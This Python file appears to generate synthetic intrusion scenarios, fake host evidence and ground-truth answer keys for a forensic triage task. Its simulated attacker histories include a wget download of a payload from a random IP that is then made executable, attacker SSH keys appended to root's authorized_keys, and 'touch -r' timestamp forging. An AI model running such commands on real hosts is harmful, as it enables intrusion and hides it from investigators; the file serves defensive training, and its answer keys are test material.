#!/usr/bin/env python3
"""Scenario generator and ground truth for the host intrusion triage task.

build(seed, family) draws one intrusion scenario in true UTC seconds: legitimate
background use of the host, one attacker, and the decoys a family forces.
write_evidence() renders it the way the host recorded it (host clock, local
syslog time without a year, rotation, binary login records, histories, the
metadata listing, dpkg state). truth() reads the attacker-labelled scenario
objects directly; it never parses the evidence, so the expected report does not
depend on any reading of the case-handling guide.

Usage: model.py <seed> <family> <out_dir> [--truth out.json]
"""

import base64
import gzip
import hashlib
import json
import random
import struct
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

FAMILIES = ["year", "clock", "rotation", "brute", "sudo", "key", "ctime", "tz", "open"]
OFFSETS = [-720, -660, -600, -480, -420, -300, -240, -210, -180, 60, 120, 180, 210, 270, 330, 345,
           420, 480, 525, 540, 570, 600, 660, 720, 780, 840]
REC = struct.Struct("<ii16s32s64sii")
MON = "Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split()
EPOCH = datetime(1970, 1, 1, tzinfo=timezone.utc)


def iso(t):
    return (EPOCH + timedelta(seconds=t)).strftime("%Y-%m-%dT%H:%M:%SZ")


def keypair(R, comment):
    blob = struct.pack(">I", 11) + b"ssh-ed25519" + struct.pack(">I", 32) + bytes(R.getrandbits(8) for _ in range(32))
    text = "ssh-ed25519 " + base64.b64encode(blob).decode() + " " + comment
    fp = "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")
    return text, fp


class Scenario:
    pass


def build(seed, family="broad"):
    R = random.Random(f"{family}:{seed}")
    f = {k: (family == "all" or k == family or R.random() < (0.5 if family == "broad" else 0.3)) for k in FAMILIES}
    s = Scenario()
    s.flags = f
    used_ips = set()

    def ip(office=False):
        while True:
            a = f"10.{R.randint(0, 255)}.{R.randint(0, 255)}.{R.randint(2, 254)}" if office else \
                f"{R.choice([45, 62, 77, 91, 103, 141, 185, 193, 203, 212])}.{R.randint(0, 255)}.{R.randint(0, 255)}.{R.randint(1, 254)}"
            if a not in used_ips:
                used_ips.add(a)
                return a

    s.off = R.choice(OFFSETS) if f["tz"] else R.choice([0] + OFFSETS)
    if f["tz"] and R.random() < 0.4:
        s.off = R.choice([-720, 840])  # envelope endpoints
    if f["year"]:
        Y = R.randint(2019, 2030)
        ia_local = datetime(Y, 12, R.randint(27, 30), R.randint(0, 23), R.randint(0, 59), R.randint(0, 59), tzinfo=timezone.utc)
    else:
        Y = R.randint(2019, 2031)
        ia_local = datetime(Y, R.randint(2, 11), R.randint(8, 24), R.randint(0, 23), R.randint(0, 59), R.randint(0, 59), tzinfo=timezone.utc)
    t_ia = int((ia_local - EPOCH).total_seconds()) - s.off * 60
    T0 = t_ia - R.randint(2, 12) * 86400 - R.randint(0, 86399)
    s.hostname = R.choice(["web-03", "app01", "db-replica-2", "ci-runner", "edge7", "files"])
    victim = R.choice(["deploy", "git", "jenkins", "ops", "build", "svcapp", "backup"])
    admin = R.choice(["alice", "hnguyen", "mkowalski", "tpham", "jsmith"])
    others = R.sample(["bob", "dana", "erik", "fatima", "gus"], R.randint(1, 2))
    uids = {"root": 0, admin: 1000, victim: 1001}
    for i, o in enumerate(others):
        uids[o] = 1002 + i
    s.victim, s.admin, s.uids = victim, admin, uids
    H, B = ip(), ip()
    O1, O2 = ip(True), ip(True)
    s.sessions, s.failures, s.lines, s.dpkg, s.pkglists = [], [], [], [], {}
    s.files, s.hist, s.keys = {}, {}, {}
    pid = [R.randint(900, 3000)]

    def npid():
        pid[0] += R.randint(1, 40)
        return pid[0]

    def session(user, host, start, end, method="password", fp=None, attacker=False):
        x = dict(user=user, host=host, start=start, end=end, method=method, fp=fp, attacker=attacker,
                 sudos=[], pid=npid(), port=R.randint(32768, 60999))
        s.sessions.append(x)
        return x

    def fail(t, user, host):
        s.failures.append((t, user, host, user not in uids))

    def setfile(path, t, mtime=None, owner="root", mode="0644"):
        s.files[path] = [mode, owner, R.randint(40, 9000), t if mtime is None else mtime, t]

    # --- attack -------------------------------------------------------------
    atk = {"fails": [], "sudo": [], "persist": {}, "rootcmds": []}
    if f["brute"]:
        d = R.randint(5, 60)
        ts = [t_ia - d - 600] + sorted(R.sample(range(t_ia - d - 599, t_ia - d), 3)) + [t_ia - d]
    else:
        ts, t = [], t_ia - R.randint(3, 40)
        for _ in range(R.randint(6, 30)):
            ts.append(t)
            t -= R.randint(2, 30)
    if R.random() < 0.5:
        ts += [t_ia - R.randint(86400, 3 * 86400) + i * R.randint(700, 2000) for i in range(R.randint(1, 3))]
    names = [victim, "admin", "oracle", "test", "ubuntu", "root", "user"]
    for t in sorted(ts):
        fail(t, R.choice(names), H)
        atk["fails"].append(t)
    dur1 = R.randint(1500, 10800)
    S1 = session(victim, H, t_ia, t_ia + dur1, attacker=True)
    pe = f["sudo"] or R.random() < 0.75
    t_pe = t_ia + R.randint(300 if f["sudo"] else 120, dur1 // 3)
    rootshell = pe and R.random() < 0.6
    s.root_stamped = R.random() < 0.6
    vhist = ["id", "uname -a", "w", "cat /etc/passwd", "ls -la", "ps aux", "sudo -l"]
    rhist = []
    key_target = None
    if f["key"]:
        key_target = "/root/.ssh/authorized_keys" if pe and R.random() < 0.4 else f"/home/{victim}/.ssh/authorized_keys"
    pool = [f"/home/{victim}/.ssh/authorized_keys", f"/var/spool/cron/crontabs/{victim}"]
    if pe:
        pool += ["/etc/cron.d/", "unit", "/etc/rc.local", "/root/.ssh/authorized_keys"]
    chosen = R.sample(pool, R.randint(1, min(3, len(pool))))
    if key_target and key_target not in chosen:
        chosen[0] = key_target
    akey, afp = keypair(R, R.choice(["x@kali", "root@vps", "k", "ops@build"]))
    if pe:
        S1["sudos"].append((t_pe, "/bin/bash" if rootshell else "/usr/bin/id", f"/home/{victim}"))
        atk["sudo"].append(t_pe)
    cursor = t_pe + 30 if pe else t_ia + 60
    cname = R.choice(["dbus-update", "sysstat-sync", "kworker", "apt-cache-clean", "netcheck"])
    for item in chosen:
        cursor += R.randint(20, 240)
        if cursor > S1["end"] - 60:
            S1["end"] = cursor + R.randint(120, 900)
        t = cursor
        priv = not item.startswith(f"/home/{victim}") and not item.startswith("/var/spool")
        paths = [item]
        if item == "/etc/cron.d/":
            paths = ["/etc/cron.d/" + cname]
        elif item == "unit":
            paths = [f"/etc/systemd/system/{cname}.service", f"/etc/systemd/system/multi-user.target.wants/{cname}.service"]
            if R.random() < 0.4:
                paths += [f"/etc/systemd/system/{cname}.timer", f"/etc/systemd/system/timers.target.wants/{cname}.timer"]
        cmd = f"sudo tee -a {paths[0]}" if priv else "crontab -"
        if item.endswith("authorized_keys"):
            line = f"echo '{akey}' >> ~/.ssh/authorized_keys" if not priv else f"echo '{akey}' | sudo tee -a /root/.ssh/authorized_keys"
            if priv and rootshell:
                rhist.append((t, f"echo '{akey}' >> /root/.ssh/authorized_keys"))
            else:
                vhist.append(line)
        elif priv and rootshell:
            rhist.append((t, f"vi {paths[0]}"))
        else:
            vhist.append(cmd)
        if priv and not rootshell:
            S1["sudos"].append((t, "/usr/bin/tee -a " + paths[0], f"/home/{victim}"))
            atk["sudo"].append(t)
        for i, p in enumerate(paths):
            owner = victim if p.startswith(f"/home/{victim}") or p.endswith("/" + victim) else "root"
            setfile(p, t + i, owner=owner, mode="0600" if "cron/crontabs" in p or "ssh" in p else "0644")
            atk["persist"][p] = t + i
        if item == "unit":
            if rootshell:
                rhist.append((t + len(paths), f"systemctl enable --now {cname}.service"))
    forged = None
    if f["ctime"] or R.random() < 0.3:
        forged = R.choice(sorted(atk["persist"]))
        s.files[forged][3] = T0 - R.randint(30, 900) * 86400
        atk["persist"][forged] += 2  # touch -r updates the ctime
        s.files[forged][4] = atk["persist"][forged]
        if rootshell and not forged.startswith(f"/home/{victim}"):
            rhist.append((atk["persist"][forged], f"touch -r /etc/hostname {forged}"))
        else:
            vhist.append(f"touch -r /etc/hostname {forged}")
    for p in ["/var/tmp/.k", "/tmp/.x11-unix-" + cname]:
        setfile(p, t_ia + R.randint(60, 600), owner=victim, mode="0755")
    vhist += ["wget -q http://" + ip() + "/k -O /var/tmp/.k", "chmod +x /var/tmp/.k", "history -w"]
    if rootshell:
        rhist.insert(0, (t_pe + 5, "id"))
        last_r = max([t for t, _ in rhist] + [t_pe + 5])
        if last_r > S1["end"] - 20:
            S1["end"] = last_r + R.randint(60, 600)
        rhist.append((last_r + R.randint(5, 60), "exit"))
        if rhist[-1][0] >= S1["end"]:
            S1["end"] = rhist[-1][0] + 30
        atk["rootcmds"] = [t for t, _ in rhist]
    s.rhist_attack = rhist
    atk_sessions = [S1]
    if f["key"] or R.random() < 0.5:
        st = S1["end"] + R.randint(1800, 72000)
        if f["key"]:
            user = "root" if key_target.startswith("/root") else victim
            S2 = session(user, B, st, st + R.randint(300, 3600), "publickey", afp, attacker=True)
        else:
            S2 = session(victim, H, st, st + R.randint(300, 3600), attacker=True)
        atk_sessions.append(S2)
        if pe and S2["user"] == victim and R.random() < 0.5:
            tt = st + R.randint(30, 200)
            S2["sudos"].append((tt, "/usr/bin/systemctl restart " + cname + ".service", f"/home/{victim}"))
            atk["sudo"].append(tt)
    if f["open"]:
        atk_sessions[-1]["end"] = None
    s.atk_sessions = atk_sessions
    s.akey, s.afp, s.pe, s.atk = akey, afp, pe, atk
    s.H, s.B = H, B
    last_atk = max([x["end"] or x["start"] for x in atk_sessions] + list(atk["persist"].values())
                   + atk["sudo"] + atk["rootcmds"])
    if f["year"]:
        jan2 = int((datetime(Y + 1, 1, 2, tzinfo=timezone.utc) - EPOCH).total_seconds()) - s.off * 60
        t_end = max(last_atk + 7200, jan2 + R.randint(0, 3 * 86400))
    else:
        t_end = last_atk + R.randint(7200, 2 * 86400)
    s.coll = t_end + R.randint(300, 3600)
    windows = [(x["start"], x["end"] if x["end"] is not None else s.coll) for x in atk_sessions]

    def in_win(t, pad=0):
        return any(a - pad <= t <= b + pad for a, b in windows)

    # --- legitimate background ---------------------------------------------
    akey_admin, afp_admin = keypair(R, f"{admin}@laptop")
    s.keys[f"/home/{admin}/.ssh/authorized_keys"] = [akey_admin]
    okey, _ = keypair(R, f"{victim}@workstation")
    s.keys[f"/home/{victim}/.ssh/authorized_keys"] = [okey]
    rkey, _ = keypair(R, "root@backup01")
    s.keys["/root/.ssh/authorized_keys"] = [rkey]
    if f"/home/{victim}/.ssh/authorized_keys" in atk["persist"]:
        s.keys[f"/home/{victim}/.ssh/authorized_keys"].append(akey)
    if "/root/.ssh/authorized_keys" in atk["persist"]:
        s.keys["/root/.ssh/authorized_keys"].append(akey)
    ahist, rhist_admin = [], []
    ahist.append((T0 - R.randint(3600, 86400 * 20), f"echo '{akey_admin}' >> ~/.ssh/authorized_keys"))
    starts = [T0 + R.randint(600, max(700, (t_ia - T0) // 2))]
    starts += [R.randint(T0, t_end - 7200) for _ in range(R.randint(2, 10))]
    root_done = False
    for st in sorted(starts):
        dur = R.randint(300, 5400)
        x = session(admin, O1, st, st + dur, "publickey", afp_admin)
        ahist.append((st + 20, R.choice(["uptime", "df -h", "journalctl -u nginx | tail", "top -bn1 | head"])))
        if not root_done and st + dur < t_ia - 3600 and not in_win(st, 3600) and not in_win(st + dur, 3600):
            root_done = True
            x["sudos"].append((st + 40, "/bin/bash", f"/home/{admin}"))
            for k in range(R.randint(2, 5)):
                rhist_admin.append((st + 60 + k * R.randint(20, 200), R.choice(["apt-get update", "systemctl status cron", "ls /etc/cron.d", "vi /etc/ssh/sshd_config", "exit"])))
            if rhist_admin[-1][0] >= x["end"]:
                x["end"] = rhist_admin[-1][0] + 60
        else:
            for _ in range(R.randint(0, 2)):
                x["sudos"].append((st + R.randint(30, dur - 30), R.choice(["/usr/bin/systemctl status nginx", "/usr/bin/apt-get update", "/usr/bin/journalctl -xe", "/usr/bin/du -sh /var/log"]), f"/home/{admin}"))
    ofails = R.randint(0, 4)
    for k in range(R.randint(1, 4)):
        st = R.randint(T0, t_end - 3600)
        if in_win(st, 600):
            continue
        for j in range(ofails if k == 0 else 0):
            fail(st - (ofails - j) * R.randint(3, 20), victim, O2)
        x = session(victim, O2, st, st + R.randint(300, 7200))
        if R.random() < 0.5:
            x["sudos"].append((st + 60, "/usr/bin/systemctl restart app", f"/home/{victim}"))
    if f["sudo"]:
        st = t_ia + R.randint(20, (t_pe - t_ia) // 2)
        x = session(victim, O2, st, st + R.randint(600, 4000))
        x["sudos"].append((R.randint(st + 5, t_pe - 5), R.choice(["/usr/bin/systemctl restart app", "/usr/bin/tail -n 50 /var/log/app/error.log"]), f"/home/{victim}/app"))
        if R.random() < 0.5:
            st2 = t_ia + R.randint(10, (t_pe - t_ia) // 2)
            y = session(admin, O1, st2, st2 + 900, "publickey", afp_admin)
            y["sudos"].append((R.randint(st2 + 3, t_pe - 3), "/usr/bin/apt-get update", f"/home/{admin}"))
    for o in others:
        for _ in range(R.randint(1, 3)):
            st = R.randint(T0, t_end - 3600)
            session(o, ip(True) if R.random() < 0.3 else O1.rsplit(".", 1)[0] + f".{R.randint(2, 254)}", st, st + R.randint(120, 3600))
    if f["brute"]:
        cu = R.choice(["carol", "ivan"])
        uids[cu] = 1005
        hotel = ip()
        st = R.randint(T0 + 3600, t_ia - 3600)
        cts = [st - 601 - R.randint(0, 200)] + sorted(R.sample(range(st - 600, st - 30), 3)) + [st - R.randint(1, 20)]
        cts[0] = min(cts[0], cts[4] - 601)
        for t in cts:
            fail(t, cu, hotel)
        session(cu, hotel, st, st + R.randint(300, 2000))
    for _ in range(R.randint(1, 2)):
        a, t = ip(), R.randint(T0, t_end - 600)
        for _ in range(R.randint(6, 25)):
            fail(t, R.choice(["root", "admin", "test", "pi", "ubuntu", "postgres"]), a)
            t += R.randint(1, 20)
    for _ in range(R.randint(3, 10)):
        a = ip()
        for _ in range(R.randint(1, 3)):
            fail(R.randint(T0, t_end), R.choice(["root", "admin", "guest", victim]), a)
    # dpkg and files
    base_old = T0 - R.randint(40, 400) * 86400
    for p in ["/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hostname", "/etc/ssh/sshd_config", "/etc/crontab",
              "/etc/cron.d/e2scrub_all", "/etc/cron.d/popularity-contest", "/etc/systemd/system/sshd.service",
              "/etc/systemd/system/multi-user.target.wants/cron.service", "/etc/systemd/system/multi-user.target.wants/ssh.service",
              "/usr/bin/sudo", "/usr/sbin/sshd", "/bin/bash", "/etc/sudoers", "/etc/profile", "/etc/rc.local"]:
        if p not in s.files:
            setfile(p, base_old + R.randint(0, 86400 * 30))
    for u in [admin, victim] + others:
        for p in [f"/home/{u}/.bashrc", f"/home/{u}/.profile", f"/home/{u}/.bash_history"]:
            setfile(p, base_old + R.randint(0, 86400 * 30), owner=u)
    for p in [f"/home/{admin}/.ssh/authorized_keys", f"/home/{victim}/.ssh/authorized_keys", "/root/.ssh/authorized_keys"]:
        if p not in s.files:
            setfile(p, base_old + R.randint(0, 86400 * 60), owner=p.split("/")[2] if p.startswith("/home") else "root", mode="0600")
    for i in range(R.randint(40, 150)):
        setfile(f"/usr/{R.choice(['bin', 'lib', 'share/doc'])}/{R.choice(['x', 'lib', 'py', 'gz'])}{i}", base_old - R.randint(0, 86400 * 300))
    pk = R.sample(["logwatch", "sysstat", "certbot", "anacron", "rkhunter", "unattended-upgrades"], 4)
    for name in pk:
        t = R.randint(T0, t_end)
        while in_win(t, 120):
            t = R.randint(T0, t_end)
        arch = f"/etc/cron.d/{name}"
        s.pkglists[name] = [arch, f"/usr/share/doc/{name}/changelog.gz", f"/usr/sbin/{name}"]
        for p in s.pkglists[name]:
            setfile(p, t, mtime=base_old)
        s.dpkg.append((t, name, f"{R.randint(1, 9)}.{R.randint(0, 20)}-{R.randint(1, 5)}"))
    if f["ctime"]:
        name = R.choice(["needrestart", "apt-listchanges", "debsums"])
        a, b = windows[0]
        t = R.randint(a + 10, b - 10)
        s.pkglists[name] = [f"/etc/cron.d/{name}", f"/usr/sbin/{name}"]
        for p in s.pkglists[name]:
            setfile(p, t, mtime=base_old)
        s.dpkg.append((t, name, "3.6-1"))
        if len(windows) > 1 and windows[1][0] - windows[0][1] > 1200:
            p = "/etc/cron.d/" + R.choice(["backup-nightly", "certbot-renew", "logs-rotate"])
            setfile(p, R.randint(windows[0][1] + 300, windows[1][0] - 300), mtime=R.randint(windows[0][0] + 1, windows[0][1] - 1))
            rhist_admin.append((T0 - 86400, "chmod 644 " + p))
    # clock correction
    s.tc = s.N = None
    s.atk = atk
    if f["clock"]:
        s.N = R.randint(30, 7200)
        hi = max(t_ia + 200, last_atk - 60)
        s.tc = R.randint(t_ia + 60, hi)
        while not within_limits(s):
            s.tc = R.randint(t_ia + 60, hi)
    victim_legit = ["ls", "git pull", "systemctl status app", "sudo systemctl restart app", "tail -f /var/log/app/app.log", "cd app", "make deploy"]
    vh = R.sample(victim_legit, len(victim_legit)) + vhist
    s.hist[f"/home/{victim}/.bash_history"] = (False, [(None, c) for c in vh])
    s.hist[f"/home/{admin}/.bash_history"] = (R.random() < 0.5, sorted(ahist))
    rh = sorted(rhist_admin + (rhist if rootshell else []))
    s.hist["/root/.bash_history"] = (s.root_stamped, rh)
    for p, (_, cmds) in s.hist.items():
        if p in s.files and cmds:
            s.files[p][3] = s.files[p][4] = max([s.files[p][4]] + [t for t, _ in cmds if t])
    s.rootshell = rootshell
    s.t_end = t_end
    return s


def within_limits(s):
    """The generator's promise behind case-guide rule 1: the collector brackets the step with lines one
    second apart, so no host-clock second is left undecided, and no graded event is in the step second."""
    if s.tc is None:
        return True
    graded = list(s.atk["fails"]) + list(s.atk["persist"].values()) + list(s.atk["sudo"]) + list(s.atk["rootcmds"])
    graded += [t for x in s.sessions for t in (x["start"], x["end"]) if t is not None]
    return 30 <= s.N <= 7200 and all(t != s.tc - 1 for t in graded)


def truth(s):
    assert within_limits(s)
    S1 = s.atk_sessions[0]
    ev = list(s.atk["fails"]) + list(s.atk["persist"].values()) + list(s.atk["sudo"])
    for x in s.atk_sessions:
        ev.append(x["start"])
        if x["end"] is not None:
            ev.append(x["end"])
    if s.rootshell and s.root_stamped:
        ev += s.atk["rootcmds"]
    accounts = {x["user"] for x in s.atk_sessions}
    pe_times = list(s.atk["sudo"]) + [x["start"] for x in s.atk_sessions if x["user"] == "root"]
    if pe_times:
        accounts.add("root")
    return {
        "initial_access": {"account": S1["user"], "source": S1["host"], "time": iso(S1["start"])},
        "sources": sorted({x["host"] for x in s.atk_sessions}),
        "accounts": sorted(accounts),
        "privilege_escalation": iso(min(pe_times)) if pe_times else None,
        "persistence": sorted(s.atk["persist"]),
        "first_activity": iso(min(ev)),
        "last_activity": iso(max(ev)),
    }


def write_evidence(s, out):
    out = Path(out)
    R = random.Random(repr(sorted(s.files)) + str(s.coll))

    def rec(t):
        return t - s.N if s.tc is not None and t < s.tc else t

    def local(t):
        return EPOCH + timedelta(seconds=rec(t) + s.off * 60)

    # tty allocation
    busy = {}
    for x in sorted(s.sessions, key=lambda x: x["start"]):
        n = 0
        while n in busy and (busy[n] is None or busy[n] >= x["start"]):
            n += 1
        busy[n] = x["end"]
        x["tty"] = f"pts/{n}"
    lines = []  # (true t, order, prog, msg)
    for t, user, host, invalid in s.failures:
        p = R.randint(2000, 90000)
        port = R.randint(32768, 60999)
        if invalid:
            lines.append((t, 1, f"sshd[{p}]", f"Invalid user {user} from {host} port {port}"))
            lines.append((t, 2, f"sshd[{p}]", f"Failed password for invalid user {user} from {host} port {port} ssh2"))
        else:
            lines.append((t, 2, f"sshd[{p}]", f"Failed password for {user} from {host} port {port} ssh2"))
    for n, x in enumerate(s.sessions):
        u, p = x["user"], x["pid"]
        tail = f": ED25519 {x['fp']}" if x["method"] == "publickey" else ""
        lines.append((x["start"], 1, f"sshd[{p}]", f"Accepted {x['method']} for {u} from {x['host']} port {x['port']} ssh2{tail}"))
        lines.append((x["start"], 2, f"sshd[{p}]", f"pam_unix(sshd:session): session opened for user {u}(uid={s.uids[u]}) by (uid=0)"))
        lines.append((x["start"], 3, "systemd-logind[611]", f"New session {n + 3} of user {u}."))
        for t, cmd, pwd in x["sudos"]:
            lines.append((t, 1, "sudo", f"{u:>8} : TTY={x['tty']} ; PWD={pwd} ; USER=root ; COMMAND={cmd}"))
            lines.append((t, 2, "sudo", f"pam_unix(sudo:session): session opened for user root(uid=0) by {u}(uid={s.uids[u]})"))
        if x["end"] is not None:
            lines.append((x["end"], 1, f"sshd[{p}]", f"pam_unix(sshd:session): session closed for user {u}"))
            lines.append((x["end"], 2, "systemd-logind[611]", f"Session {n + 3} logged out. Waiting for processes to exit."))
    t = s.atk_sessions[0]["start"] - 20 * 86400
    t = t - t % 3600 + 17 * 60
    while t < s.t_end:
        if R.random() < 0.8:
            p = R.randint(2000, 90000)
            lines.append((t, 1, f"CRON[{p}]", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)"))
            lines.append((t + 1, 1, f"CRON[{p}]", "pam_unix(cron:session): session closed for user root"))
        t += 3600
    noise_ts = [R.randint(s.coll - 25 * 86400, s.t_end) for _ in range(R.randint(10, 60))]
    if s.tc is not None:
        noise_ts += [s.tc - 1, s.tc]  # the collector sees one line on each side of the step
    for t in noise_ts:
        a = f"{R.choice([45, 91, 185, 193])}.{R.randint(0, 255)}.{R.randint(0, 255)}.{R.randint(1, 254)}"
        lines.append((t, 0, f"sshd[{R.randint(2000, 90000)}]", f"Connection closed by {a} port {R.randint(32768, 60999)} [preauth]"))
    lines.sort(key=lambda r: (rec(r[0]), r[1]))
    fwd = [f"{iso(t)} {s.hostname} {prog}: {msg}" for t, _, prog, msg in lines
           if prog.startswith("sshd[") and not msg.startswith(("Failed password", "Invalid user")) and t <= s.t_end]
    (out / "var/log/remote").mkdir(parents=True, exist_ok=True)
    (out / "var/log/remote" / f"{s.hostname}.log").write_text("\n".join(fwd) + "\n")
    first_atk = min(s.atk["fails"])
    if s.flags["rotation"]:
        brute = sorted(t for t in s.atk["fails"] if t > s.atk_sessions[0]["start"] - 3600)
        cut = brute[-3]
        lines = [r for r in lines if r[0] >= cut]
    else:
        start = min(first_atk, min(x["start"] for x in s.sessions), min(t for t, *_ in s.failures)) - 3600
        lines = [r for r in lines if r[0] >= start]
    text = [f"{MON[local(t).month - 1]} {local(t).day:>2} {local(t):%H:%M:%S} {s.hostname} {prog}: {msg}" for t, _, prog, msg in lines]
    nfiles = R.randint(1, 6)
    cuts = sorted(R.sample(range(1, len(text)), nfiles - 1)) if nfiles > 1 else []
    parts = [text[a:b] for a, b in zip([0] + cuts, cuts + [len(text)])]
    logdir = out / "var/log"
    logdir.mkdir(parents=True, exist_ok=True)
    for i, part in enumerate(reversed(parts)):
        data = ("\n".join(part) + "\n").encode()
        if i == 0:
            (logdir / "auth.log").write_bytes(data)
        elif i == 1:
            (logdir / "auth.log.1").write_bytes(data)
        else:
            (logdir / f"auth.log.{i}.gz").write_bytes(gzip.compress(data, mtime=0))

    def pack(typ, pid, line, user, host, t):
        return REC.pack(typ, pid, line.encode(), user.encode(), host.encode(), rec(t), R.randint(0, 999999))

    w = [(min(x["start"] for x in s.sessions) - 86400 * 2, pack(2, 0, "~", "reboot", "6.1.0-18-amd64", min(x["start"] for x in s.sessions) - 86400 * 2))]
    for x in s.sessions:
        w.append((x["start"], pack(7, x["pid"] + 1, x["tty"], x["user"], x["host"], x["start"])))
        if x["end"] is not None:
            w.append((x["end"], pack(8, x["pid"] + 1, x["tty"], "", "", x["end"])))
    (logdir / "wtmp").write_bytes(b"".join(b for _, b in sorted(w, key=lambda r: rec(r[0]))))
    (logdir / "btmp").write_bytes(b"".join(pack(6, R.randint(2000, 90000), "ssh:notty", u, hst, t)
                                           for t, u, hst, _ in sorted(s.failures)))
    dl = []
    for t, name, ver in sorted(s.dpkg):
        for i, st in enumerate(["startup archives unpack", f"install {name}:all <none> {ver}", f"status half-installed {name}:all {ver}",
                                f"configure {name}:all {ver} {ver}", f"status installed {name}:all {ver}"]):
            dl.append(f"{local(t):%Y-%m-%d %H:%M:%S} {st}")
    (logdir / "dpkg.log").write_text("\n".join(dl) + "\n")
    info = out / "var/lib/dpkg/info"
    info.mkdir(parents=True, exist_ok=True)
    for name in ["base-files", "cron", "openssh-server"] + list(s.pkglists):
        paths = s.pkglists.get(name, [f"/usr/share/doc/{name}/copyright"])
        if name == "cron":
            paths = ["/etc/crontab", "/usr/sbin/cron"]
        (info / f"{name}.list").write_text("\n".join(paths) + "\n")
    for p, (stamped, cmds) in s.hist.items():
        d = out / p.lstrip("/")
        d.parent.mkdir(parents=True, exist_ok=True)
        body = []
        for t, c in cmds:
            if stamped and t is not None:
                body.append(f"#{rec(t)}")
            body.append(c)
        d.write_text("\n".join(body) + "\n")
    for p, keys in s.keys.items():
        d = out / p.lstrip("/")
        d.parent.mkdir(parents=True, exist_ok=True)
        d.write_text("\n".join(keys) + "\n")
    rows = ["path\tmode\towner\tsize\tmtime\tctime"]
    for p in sorted(s.files):
        mode, owner, size, mt, ct = s.files[p]
        rows.append(f"{p}\t{mode}\t{owner}\t{size}\t{rec(mt)}\t{rec(ct)}")
    (out / "fs-listing.tsv").write_text("\n".join(rows) + "\n")
    off = s.off
    sign = "+" if off >= 0 else "-"
    (out / "collection.txt").write_text(
        f"hostname: {s.hostname}\nutc_offset: {sign}{abs(off) // 60:02d}:{abs(off) % 60:02d}\ncollected_utc: {iso(s.coll)}\n")


def main(argv):
    seed, family, out = argv[1], argv[2], argv[3]
    s = build(seed, family)
    write_evidence(s, out)
    if "--truth" in argv:
        Path(argv[argv.index("--truth") + 1]).write_text(json.dumps(truth(s), indent=2) + "\n")


if __name__ == "__main__":
    main(sys.argv)
